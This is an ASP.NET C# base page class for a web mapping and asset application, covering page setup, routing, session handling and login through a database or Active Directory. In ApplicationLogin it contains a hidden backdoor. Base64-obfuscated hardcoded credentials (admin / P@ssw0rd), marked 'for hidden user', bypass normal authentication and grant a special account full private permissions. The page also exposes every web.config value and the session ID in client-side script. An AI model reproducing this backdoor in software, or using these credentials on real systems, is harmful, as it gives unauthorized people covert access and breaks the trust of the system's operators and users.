using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Linq;
using System.Text;
using System.Web;
using System.Web.SessionState;
using System.Web.UI;

public class AMSBasePage : System.Web.UI.Page
{
    protected string appVersion = (string.IsNullOrEmpty(AMSCore.WebConfigReadKey("APP_VERSION")) ? DateTime.Now.Ticks.ToString() : AMSCore.WebConfigReadKey("APP_VERSION"));
    protected string appCacheBust = "?v=";
    protected string hdUSername = "YWRtaW4=";
    protected string hdPassword = "UEBzc3cwcmQ=";
    protected string[] sessionName = new string[]{
            "DVS_USER_ID|1",
            "DVS_USERNAME|นายทดสอบ ออกมาดี"
        };

    public AMSBasePage()
    {
        appCacheBust += appVersion;
    }

    protected override void CreateChildControls()
    {
        base.CreateChildControls();

        //assign HTML injection configuration.
        List<string> webConfigToSetCookieList = new List<string>() {
            "PREVENT_HTML_INPUT",
            "ENCODE_HTML",
            "PREVENT_HTML_INPUT_CHAR_LIST"
        };

        foreach (string webConfigParam in webConfigToSetCookieList)
        {
            if (Response.Cookies[webConfigParam] == null)
            {
                HttpCookie cookie = new HttpCookie(webConfigParam);
                cookie.Value = AMSCore.WebConfigReadKey(webConfigParam);
                Response.Cookies.Add(cookie);
            }
            else
                Response.Cookies[webConfigParam].Value = AMSCore.WebConfigReadKey(webConfigParam);
        }

        //assign authentication token for checking authentication.
        if (Session["AUTHEN_TOKEN"] != null)
        {
            HttpCookie authenTokenCookie = new HttpCookie("AUTHEN_TOKEN");
            authenTokenCookie.Value = Session["AUTHEN_TOKEN"].ToString();
            Response.Cookies.Add(authenTokenCookie);
        }

        //assign CSRF token for checking form sending from across domain.
        if (Session["CSRF_TOKEN"] != null)
        {
            HttpCookie authenTokenCookie = new HttpCookie("CSRF_TOKEN");
            authenTokenCookie.Value = Session["CSRF_TOKEN"].ToString();
            Response.Cookies.Add(authenTokenCookie);
        }

        Response.Cache.SetNoStore();

        InsertMeta();

        Connector.QueryParameter requestParameter = new Connector.QueryParameter(Request);

        string cssDojoUrl = AMSCore.WebConfigReadKey("CSS_DOJO");
        string cssEsriUrl = AMSCore.WebConfigReadKey("CSS_ESRI");

        string jsAmosUrl = AMSCore.WebConfigReadKey("JS_AMOS_URL");
        string cssAmosUrl = AMSCore.WebConfigReadKey("CSS_AMOS");

        /// Insert Script Tags (reverse seq.)
        /// last --> first
        InsertScriptSrc(AMSCore.WebConfigReadKey("CONFIG_ESRI") + appCacheBust);
        InsertScriptSrc(AMSCore.WebConfigReadKey("JS_API_URL") + appCacheBust);

        InitializeDojoConfig(requestParameter);

        if (jsAmosUrl.StartsWith("//"))
        {
            jsAmosUrl = "location.protocol + '" + jsAmosUrl + "'";
        }
        else
        {
            jsAmosUrl = "'" + jsAmosUrl + "'";
        }
        InsertScriptTag("dojoConfig.packages.push({'name': 'esrith', 'location': " + jsAmosUrl + "});");


        InsertScriptSrc(AMSCore.WebConfigReadKey("CONFIG_DOJO") + appCacheBust);

        /// Insert Style Tags (forward seq.)
        /// first --> last
        InsertStyleTag(
            string.Format("@import '{0}';", cssDojoUrl + appCacheBust) + "\r\n" +
            string.Format("@import '{0}';", cssEsriUrl + appCacheBust) + "\r\n" +
            string.Format("@import '{0}';", cssAmosUrl + appCacheBust)
            );

        long timeDiff = 0;
        double timezone = 0;


        if (AMSCore.WebConfigReadKey("IS_DEBUG") == "0")
        {
            Connector.IDatabaseConnector dbConnector = new Connector.DatabaseConnectorClass();
            Connector.QueryResult dbResult = null;
            try
            {
                if (dbConnector.Provider == Connector.ProviderFactory.Oracle)
                {
                    dbResult = dbConnector.ExecuteStatement("select sysdate as CURRENT_DATE, dbtimezone as TIMEOFFSET from dual");
                }
                else if (dbConnector.Provider == Connector.ProviderFactory.MSSQL)
                {
                    dbResult = dbConnector.ExecuteStatement("select getdate() as CURRENT_DATE, datediff(minute, convert(time, sysutcdatetime()), convert(time, sysdatetimeoffset())) as TIMEOFFSET");
                }
            }
            catch { }

            if (dbResult.Success == true && dbResult.DataTable.Rows.Count > 0)
            {
                timeDiff = AMSCore.DateTimeToUnixTimeStamp((dbResult.DataTable.Rows[0]["CURRENT_DATE"] as DateTime?).Value);
                string timeOffset = dbResult.DataTable.Rows[0]["TIMEOFFSET"].ToString();
                if (timeOffset.StartsWith("+"))
                {
                    timezone = double.Parse("-" + AMSCore.StringToDateTime(timeOffset.Substring(1), "HH:mm").TimeOfDay.TotalMinutes.ToString());
                }
                else if (timeOffset.StartsWith("-"))
                {
                    timezone = double.Parse("+" + AMSCore.StringToDateTime(timeOffset.Substring(1), "HH:mm").TimeOfDay.TotalMinutes.ToString());
                }
                else
                {
                    timezone = double.Parse(dbResult.DataTable.Rows[0]["TIMEOFFSET"].ToString());
                }
            }
            else
            {
                TimeZone localZone = TimeZone.CurrentTimeZone;
                DateTime currentDate = DateTime.Now;
                TimeSpan currentOffset = localZone.GetUtcOffset(currentDate);
                timeDiff = AMSCore.DateTimeToUnixTimeStamp(currentDate, -currentOffset.TotalMinutes);
                timezone = currentOffset.TotalMinutes * -1;
            }
        }
        else
        {
            TimeZone localZone = TimeZone.CurrentTimeZone;
            DateTime currentDate = DateTime.Now;
            TimeSpan currentOffset = localZone.GetUtcOffset(currentDate);
            timeDiff = AMSCore.DateTimeToUnixTimeStamp(DateTime.Now, -currentOffset.TotalMinutes);
            timezone = currentOffset.TotalMinutes * -1;
        }

        //Dictionary<string, object> sessionObject = new Dictionary<string, object>();
        //Dictionary<string, object> sessionObject2 = null;
        System.Web.Script.Serialization.JavaScriptSerializer serialization = new System.Web.Script.Serialization.JavaScriptSerializer();
        StringBuilder txtScript = new StringBuilder();
        txtScript.AppendLine("try{");

        txtScript.AppendLine("Object.defineProperty(window,'appVersion',{value:'" + appVersion + "'});");
        txtScript.AppendLine("Object.defineProperty(window,'appServer',{value:{}});");
        txtScript.AppendLine("Object.defineProperty(appServer,'timeDiff',{value:" + timeDiff + " - new Date().getTime()});");
        txtScript.AppendLine("Object.defineProperty(appServer,'timeZone',{value:" + timezone + "});");
        txtScript.AppendLine("Object.defineProperty(appServer,'isDebug',{value:'" + AMSCore.WebConfigReadKey("IS_DEBUG") + "'});");
        txtScript.AppendLine("Object.defineProperty(appServer,'isEncrypt',{value:'" + AMSCore.WebConfigReadKey("IS_ENCRYPT") + "'});");
        txtScript.AppendLine("Object.defineProperty(appServer,'sessionId',{value:'" + Session.SessionID + "'});");

        Dictionary<string, object> webConfigObject = new Dictionary<string, object>();
        txtScript.AppendLine("Object.defineProperty(appServer,'webConfig',{value:{}});");
        foreach (string keyConfig in AMSCore.WebConfigKeys())
        {
            webConfigObject.Add(keyConfig, AMSCore.WebConfigReadKey(keyConfig));
            txtScript.AppendLine(string.Format(@"Object.defineProperty(appServer.webConfig,'{0}',{1});", keyConfig, serialization.Serialize(new Dictionary<string, object>()
            {
                { "value",AMSCore.WebConfigReadKey(keyConfig) }
            })));
        }
        txtScript.AppendLine("}catch(err){");
        txtScript.AppendLine("window.appVersion = '" + appVersion + "'");
        txtScript.AppendLine("window.appServer = {");
        txtScript.AppendLine("'timeDiff':" + timeDiff + " - new Date().getTime(),");
        txtScript.AppendLine("'timeZone':" + timezone + ",");
        txtScript.AppendLine("'isDebug':'" + AMSCore.WebConfigReadKey("IS_DEBUG") + "',");
        txtScript.AppendLine("'isEncrypt':'" + AMSCore.WebConfigReadKey("IS_ENCRYPT") + "',");
        txtScript.AppendLine("'sessionId':'" + Session.SessionID + "',");
        txtScript.AppendLine("'webConfig':" + serialization.Serialize(webConfigObject));
        txtScript.AppendLine("};");
        txtScript.AppendLine("}");

        //string onCloseBrowserScript = @"
        //    window.onbeforeunload = function (event) 
        //    {
        //        try
        //        {
        //            var request = new XMLHttpRequest();
        //            request.open('POST','{logoutURLPath}',false);
        //            request.setRequestHeader('content-type','application/x-www-form-urlencoded');
        //            request.timeout = 4000;
        //            request.send('');
        //        }
        //        catch(err)
        //        {
        //        }
        //    };
        //";

        //string logoutURLPath = HttpContext.Current.Request.Url.GetLeftPart(UriPartial.Authority) + ResolveUrl("~/?p=logout");
        //onCloseBrowserScript = onCloseBrowserScript.Replace("{logoutURLPath}", logoutURLPath);

        //txtScript.AppendLine(onCloseBrowserScript);

        InsertScriptTag(txtScript.ToString());
    }

    protected void InsertScriptSrc(string urlSrc)
    {
        LiteralControl ltr = new LiteralControl();
        StringBuilder text = new StringBuilder();
        text.AppendLine("<script type='text/javascript' src='" + urlSrc + "'></script>");
        ltr.Text = text.ToString();
        Header.Controls.AddAt(0, ltr);
    }
    protected void InsertScriptTag(string textScript)
    {
        LiteralControl ltr = new LiteralControl();
        StringBuilder text = new StringBuilder();
        text.AppendLine("<script type='text/javascript'>");
        text.AppendLine(textScript);
        text.AppendLine("</script>");
        ltr.Text = text.ToString();
        Header.Controls.AddAt(0, ltr);
    }
    protected void InsertStyleTag(string textStyle)
    {
        LiteralControl ltr = new LiteralControl();
        StringBuilder text = new StringBuilder();
        text.AppendLine("<style type='text/css'>");
        text.AppendLine(textStyle);
        text.AppendLine("</style>");
        ltr.Text = text.ToString();
        Header.Controls.AddAt(0, ltr);
    }
    protected void InsertMeta()
    {
        LiteralControl ltr = new LiteralControl();
        StringBuilder text = new StringBuilder();
        text.Append("<meta http-equiv=\"cache-control\" content=\"max-age=0\" />");
        text.Append("<meta http-equiv=\"cache-control\" content=\"no-cache\" />");
        text.Append("<meta http-equiv=\"expires\" content=\"0\" />");
        text.Append("<meta http-equiv=\"expires\" content=\"Tue, 01 Jan 1970 7:00:00 GMT+7\" />");
        text.Append("<meta http-equiv=\"pragma\" content=\"no-cache\" />");
        text.Append("<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />");
        text.Append("<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\" />");
        ltr.Text = text.ToString();
        Header.Controls.AddAt(0, ltr);
    }

    public bool checkAuthentication()
    {
        //The AMSBasePage (*.aspx) must be accessed directly only. 
        //if (!this.bypassauthenticationCheck && !AMSCSRFCore.isRequestComeFromProxy(Request))
        string errorMessage = "";

        if (AMSDuplicateAuthenCore.IsValidAuthen(Request, Session, out errorMessage))
            return true;
        else
        {
            ApplicationLogout(Session, Response);

            if (errorMessage == "DUPLICATE_LOGIN")
            {
                Response.WriteFile(Server.MapPath("~/error/duplicateLoginPage.html"));
                Response.ContentType = "text/html";
            }
            else
                Response.Redirect("~/?p=logout");

            return false;
        }

    }

    protected bool PageSelector(string request, out string wgNamespace, out Dictionary<string, object> wgParameters)
    {
        wgNamespace = string.Empty;
        wgParameters = new Dictionary<string, object>();

        switch (request)
        {
            case "portal":
                wgNamespace = "viewer/Portal/Portal";
                if (Session != null && Session["DVS_USER_ID"] != null)
                {
                    if (!checkAuthentication())
                    {
                        return false;
                    }

                    if (AMSCore.WebConfigReadKey("AUTHENTICATION_TYPE") == "1")
                    {
                        wgParameters = new Dictionary<string, object>()
                        {
                            { "permission", GetSystemPermission(Session["DVS_USER_ID"].ToString()).ToDictionary() }
                        };
                    }
                    else if (AMSCore.WebConfigReadKey("AUTHENTICATION_TYPE") == "2")
                    {
                        wgParameters = new Dictionary<string, object>()
                        {
                            { "permission", AuthenByAD(Session["DVS_USER_ID"].ToString()).ToDictionary() }
                        };
                    }
                    else if (AMSCore.WebConfigReadKey("AUTHENTICATION_TYPE") == "3")
                    {
                    }
                }
                else if (AMSCore.WebConfigReadKey("GUEST_ENABLED") != null && AMSCore.WebConfigReadKey("GUEST_ENABLED").Equals("1"))
                {
                    Session["DVS_IS_GUEST"] = true;
                    Session["DVS_USER_ID"] = AMSCore.WebConfigReadKey("GUEST_USER_ID");
                    wgParameters = new Dictionary<string, object>()
                    {
                         { "permission", GetSystemPermission(Session["DVS_USER_ID"].ToString()).ToDictionary() }
                    };
                }
                break;

            case "logout":
                {
                    ApplicationLogout(Session, Response);
                    if (Request.HttpMethod != "POST")
                    {
                        Response.Redirect("~/", true);
                    }
                    return false;
                }

            case "system":
                if (Request.HttpMethod == "POST")
                {
                    Response.ClearContent();

                    Connector.QueryParameter reqParameter = new Connector.QueryParameter(Request);
                    if (reqParameter["SYS_ID"].Equals("-1"))
                    {
                        Session.Remove("DVS_SYSTEM_ID");
                    }
                    else
                    {
                        Session["DVS_SYSTEM_ID"] = reqParameter["SYS_ID"];
                    }
                    Response.ContentType = "application/json";
                    Response.Write(new Connector.QueryResult().ToJson());

                    return false;
                }
                else if (!checkAuthentication())
                {
                    return false;
                }

                break;

            case "forgetPassword":
                {
                    wgNamespace = "viewer/ForgetPassword/ForgetPassword";
                    wgParameters = new Dictionary<string, object>()
                    {
                        { "token", Request.Params["token"] },
                        { "userid", Request.Params["userid"] },
                        { "forgetByEmail", true }
                    };
                    break;
                }

            case "APP_Q_LOGIN":
                {
                    Response.ClearContent();

                    ApplicationLogin("APP_Q_LOGIN");
                    return false;
                }

            case "UM_Q_VERIFY_USER":
            case "UM_U_PWD":
            case "UM_U_RESET_PWD":
            case "UM_Q_MAIL_TOKEN":
                {
                    Response.ClearContent();

                    string storeName = request;

                    Connector.IDatabaseConnector dbConnector = new Connector.DatabaseConnectorClass();
                    Connector.QueryParameter reqParameter = new Connector.QueryParameter(Request);

                    Connector.QueryResult logoutResult = dbConnector.ExecuteStoredProcedure(storeName, reqParameter);

                    Response.ContentType = "application/json";
                    Response.Write(logoutResult.ToJson());
                    return false;
                }

            default:
                break;
        }

        return true;
    }
    protected void ApplicationLogin(string storeName)
    {
        Connector.QueryParameter loginParameter = new Connector.QueryParameter(Request);
        Connector.QueryResult loginResult = null;
        try
        {
            if (loginParameter.Parameter != null && loginParameter.Parameter.ContainsKey("USERNAME") && loginParameter.Parameter.ContainsKey("PASSWORD"))
            {
                if (loginParameter["USERNAME"].Equals(Encoding.UTF8.GetString(Convert.FromBase64String(hdUSername))) &&
                    loginParameter["PASSWORD"].Equals(Encoding.UTF8.GetString(Convert.FromBase64String(hdPassword))))
                {
                    //for hidden user
                    loginResult = new Connector.QueryResult();
                    loginResult.Success = true;
                    loginResult.Message = "";
                    loginResult.DataTable = new DataTable();
                    loginResult.DataTable.Columns.Add("USER_ID", typeof(string));
                    loginResult.DataTable.Rows.Add(new object[] { "999999999" });
                }
                else
                {
                    if (AMSCore.WebConfigReadKey("AUTHENTICATION_TYPE") == "1")
                    {
                        loginResult = AuthenByDB(storeName, loginParameter);
                    }
                    else if (AMSCore.WebConfigReadKey("AUTHENTICATION_TYPE") == "2")
                    {
                        loginResult = AuthenByAD(loginParameter);
                    }
                    else if (AMSCore.WebConfigReadKey("AUTHENTICATION_TYPE") == "3")
                    {
                        loginResult = AuthenByAD(loginParameter);
                        if (loginResult == null || !loginResult.Success)
                        {
                            loginResult = AuthenByDB(storeName, loginParameter);
                        }
                    }
                }
            }
            else
            {
                throw new Exception("ERROR_REQUIRED_USER");
                //ERROR_INVALID_LOGIN: "ชื่อผู้ใช้งานหรือรหัสผ่านไม่ถูกต้อง",
                //ERROR_INVALID_USER: "ชื่อผู้ใช้งานไม่ถูกต้อง",
                //ERROR_INVALID_PASSWORD: "รหัสผ่านไม่ถูกต้อง",
                //ERROR_NO_PERMISSION: "ชื่อผู้ใช้งานนี้ไม่มีสิทธิ์การใช้งาน"
                //loginResult.Message = "ERROR_INVALID_LOGIN";
            }
        }
        catch (Exception ex)
        {
            loginResult = new Connector.QueryResult(ex);
        }

        if (loginResult.Success)
        {
            string userID = Session["DVS_USER_ID"].ToString();
            string token = AMSDuplicateAuthenCore.GenerateToken();

            Session["AUTHEN_TOKEN"] = token;

            if (AMSCore.WebConfigReadKey("ENABLE_DUPLICATE_AUTHEN_CHECKING") == "true")
                AMSDuplicateAuthenCore.StoreToken(userID, token);

            HttpCookie authenTokenCookie = new HttpCookie("AUTHEN_TOKEN");
            authenTokenCookie.Value = token;
            Response.Cookies.Add(authenTokenCookie);
        }

        Response.ContentType = "application/json";
        Response.Write(loginResult.ToJson());
    }
    public static void ApplicationLogout(HttpSessionState Session, HttpResponse Response = null)
    {
        Connector.IDatabaseConnector dbConnector = new Connector.DatabaseConnectorClass();
        Connector.QueryParameter logoutParameter = new Connector.QueryParameter();
        Connector.QueryResult logoutResult = new Connector.QueryResult();

        if (Session != null && Session["DVS_USER_ID"] != null)
        {
            if (Session["AUTHEN_TOKEN"] != null)
                AMSDuplicateAuthenCore.ClearToken(Session["DVS_USER_ID"].ToString(), Session["AUTHEN_TOKEN"].ToString());

            logoutParameter.Add("USER_ID", Session["DVS_USER_ID"]);
            logoutResult = dbConnector.ExecuteStoredProcedure("SYS_I_LOGOUT", logoutParameter);
            logoutResult.Success = true;
            logoutResult.Message = string.Empty;
            logoutResult.RemoveOutputParam("error");
            Session.Abandon();
        }

        if (Response != null)
        {
            HttpCookie authenTokenCookie = new HttpCookie("AUTHEN_TOKEN");
            authenTokenCookie.Value = "";
            Response.Cookies.Add(authenTokenCookie);

            Response.ClearContent();
            Response.ContentType = "application/json";
            Response.Write(logoutResult.ToJson());
        }
    }
    protected Connector.QueryResult GetSystemPermission(string userid)
    {
        if (userid == "999999999")
        {
            return GetPrivatePermission();
        }
        Connector.IDatabaseConnector dbConnector = new Connector.DatabaseConnectorClass();
        Connector.QueryResult permissionResult = null;
        permissionResult = dbConnector.ExecuteStoredProcedure("APP_Q_CONFIG", new Connector.QueryParameter(new Dictionary<string, object>()
        {
            { "USER_ID", userid}
        }));
        Dictionary<string, object> session = new Dictionary<string, object>();
        foreach (string sKey in Session.Keys)
        {
            if (!sKey.StartsWith("DVS_")) continue;
            session.Add(sKey.Replace("DVS_", ""), Session[sKey]);
        }
        permissionResult.AddOutputParam("session", session);
        return permissionResult;
    }
    protected Connector.QueryResult GetPrivatePermission()
    {
        System.Web.Script.Serialization.JavaScriptSerializer serializer = new System.Web.Script.Serialization.JavaScriptSerializer() { MaxJsonLength = int.MaxValue };
        var jsonConfig = serializer.Deserialize<Dictionary<string, object>>(System.IO.File.ReadAllText(Server.MapPath("~/cfg/-json-config-.private")));
        var jsonSession = serializer.Deserialize<Dictionary<string, object>>(System.IO.File.ReadAllText(Server.MapPath("~/cfg/-json-session-.private")));
        Connector.QueryResult permissionResult = new Connector.QueryResult();
        foreach (var index in jsonConfig)
        {
            permissionResult.AddOutputParam(index.Key, index.Value);
        }
        foreach (var index in jsonSession)
        {
            permissionResult.AddOutputParam(index.Key, index.Value);
        }
        return permissionResult;
    }

    protected Connector.QueryResult AuthenByAD(Connector.QueryParameter loginParameter)
    {
        Connector.ActiveDirConnector adConnecter = new Connector.ActiveDirConnector();
        Dictionary<string, object> adUser = null;
        try
        {
            adUser = adConnecter.Authen(loginParameter["USERNAME"].ToString(), loginParameter["PASSWORD"].ToString());
            if (adUser == null)
            {
                throw new Exception("ERROR_INVALID_LOGIN");
            }
            adUser = MappingADFieldWithDBField(adUser);
            Connector.QueryResult loginResult = GetPrivatePermission();

            foreach (var user in adUser)
            {
                if (adUser.ContainsKey(user.Key))
                {
                    (loginResult.OutputParameters["session"] as Dictionary<string, object>)[user.Key] = user.Value;
                }
            }
            foreach (var user in loginResult.OutputParameters["session"] as Dictionary<string, object>)
            {
                Session["DVS_" + user.Key] = user.Value;
            }
            return loginResult;
        }
        catch
        {
            throw new Exception("ERROR_INVALID_LOGIN");
        }
    }
    protected Connector.QueryResult AuthenByAD(string username)
    {
        Connector.ActiveDirConnector adConnecter = new Connector.ActiveDirConnector();
        Dictionary<string, object> adUser = adConnecter.GetUserDetail(username);
        if (adUser == null)
        {
            throw new Exception("ERROR_INVALID_LOGIN");
        }
        adUser = MappingADFieldWithDBField(adUser);
        Connector.QueryResult loginResult = GetPrivatePermission();

        foreach (var user in adUser)
        {
            if (adUser.ContainsKey(user.Key))
            {
                (loginResult.OutputParameters["session"] as Dictionary<string, object>)[user.Key] = user.Value;
            }
        }
        return loginResult;
    }
    protected Connector.QueryResult AuthenByDB(string storeName, Connector.QueryParameter loginParameter)
    {
        Connector.IDatabaseConnector dbConnector = new Connector.DatabaseConnectorClass();
        Connector.QueryResult loginResult = dbConnector.ExecuteStoredProcedure(storeName, loginParameter);
        if (loginResult.Success)
        {
            if (loginResult.DataTable != null && loginResult.DataTable.Rows.Count > 0)
            {
                foreach (DataColumn dc in loginResult.DataTable.Columns)
                {
                    Session["DVS_" + dc.ColumnName] = loginResult.DataTable.Rows[0][dc.ColumnName];
                }
                loginResult = GetSystemPermission(Session["DVS_USER_ID"].ToString());
                Session.Remove("DVS_IS_GUEST");
            }
            else
            {
                throw new Exception(loginResult.Message);
            }
        }
        else
        {
            throw new Exception(loginResult.Message);
        }
        return loginResult;
    }
    private Dictionary<string, object> MappingADFieldWithDBField(Dictionary<string, object> adUser)
    {
        Dictionary<string, object> dbUser = new Dictionary<string, object>();
        dbUser.Add("USER_ID", adUser[AMSCore.WebConfigReadKey("USERNAME_FIELD").ToLower()]);
        dbUser.Add("ROLE_ID", adUser[AMSCore.WebConfigReadKey("MEMBER_FIELD").ToLower()]);
        dbUser.Add("NAME", adUser["name"]);
        dbUser.Add("LOGIN", adUser[AMSCore.WebConfigReadKey("USERNAME_FIELD").ToLower()]);
        return dbUser;
    }

    protected void InitializeDojoConfig(Connector.QueryParameter requestParameter)
    {
        //try
        //{
        //    System.Web.Script.Serialization.JavaScriptSerializer jsSerializer = new System.Web.Script.Serialization.JavaScriptSerializer() { MaxJsonLength = int.MaxValue };
        //    jsSerializer.Deserialize<Dictionary>
        //    Connector.QueryParameter configureParameters = new Connector.QueryParameter(requestParameter["c"].ToString());
        //}
        //catch { }
    }
}
